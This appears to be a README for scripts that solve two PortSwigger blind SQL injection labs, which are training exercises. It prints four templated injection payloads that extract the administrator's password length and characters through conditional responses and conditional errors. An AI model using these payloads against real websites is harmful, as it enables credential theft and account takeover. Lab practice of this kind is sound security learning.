# SQL Injection PortSwigger Labs
The script gets the password length and execute a bruteforce attack to the web.
- Lab: Blind SQL injection with conditional responses
```sql
'and (select 'a' from users where username = 'administrator' and length(password) > {counter}) = 'a
```
```sql
'and (select substring(password, {position}, 1) from users where username = 'administrator') = '{character}
```
- Lab: Blind SQL injection with conditional errors
```sql
'||(SELECT CASE WHEN '1' = '1' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password) > {counter})||'
```
```sql
'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{character}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

## Requirements
- pwntools
- request

All the requirements can be installed from requirements.txt file executing this on terminal:
```bash
pip3 install -r requirements.txt
```